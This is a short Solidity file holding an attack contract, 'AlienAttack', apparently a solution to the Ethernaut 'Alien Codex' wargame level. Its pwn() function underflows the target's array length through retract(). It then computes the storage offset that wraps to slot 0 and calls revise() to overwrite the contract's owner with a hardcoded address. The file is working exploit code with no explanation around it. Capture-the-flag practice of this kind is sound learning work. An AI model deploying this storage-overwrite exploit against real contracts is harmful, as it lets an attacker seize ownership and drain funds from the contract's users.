pragma solidity ^0.8.0;
interface Alien{

  function make_contact() external;

  function record(bytes32 _content) external;
  	
  function retract() external;

  function revise(uint i, bytes32 _content) external;
}

contract AlienAttack{
    uint public offsetForCorrectOverflow; //public storage variables for debugging
    bytes32 public addressInBytes;
    uint public arrayStart;

    address contractAddress = address(0x5Bc551A0864693a74FF5868A38d55bf84E1050BA);

    function pwn() public {
        Alien contractInstance = Alien(contractAddress);
        contractInstance.retract();
        
        arrayStart = uint(keccak256(abi.encodePacked(uint(1))));
        offsetForCorrectOverflow = (2**256 - 1) - arrayStart + 1;  
        addressInBytes = bytes32(uint256(uint160(bytes20(address(0x737e11E7A11A01891d2cB1b0A07C59A63dcd657C)))));
        
        contractInstance.revise(offsetForCorrectOverflow, addressInBytes);
    }
}